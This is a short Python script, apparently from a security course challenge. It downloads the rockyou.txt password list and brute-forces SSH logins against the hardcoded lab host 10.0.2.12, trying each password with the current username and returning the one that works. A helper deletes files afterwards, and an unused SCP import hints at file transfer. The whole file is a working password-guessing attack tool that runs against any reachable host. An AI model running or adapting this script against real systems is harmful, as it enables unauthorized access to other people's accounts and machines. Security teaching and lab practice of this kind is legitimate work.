import urllib.request, os, paramiko,getpass
from scp import SCPClient
from time import sleep


## Creating rock you 
def create_rockyou():
    url = "https://raw.githubusercontent.com/jinwoov/Ops401/master/ops_challenge/ops-challenge18/rockyou.txt"
    urllib.request.urlretrieve(url, "rockyou.txt")

def createSSHClient(server, port, users, password):
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(server, port, users, password)
    return client


def read_txt():
    rock_you = os.path.abspath("./rockyou.txt")
    txtFile = open(rock_you, "r")
    passwords = txtFile.read().splitlines()
    return passwords

def crack_ssh(password_list):
    user = getpass.getuser()
    for pw in password_list:
        try:
            print(f"trying {pw}...")
            sleep(0.2)
            createSSHClient("10.0.2.12", 22, user, pw)
            return pw
        except:
            continue

def remove_file(filename):
    os.remove(filename)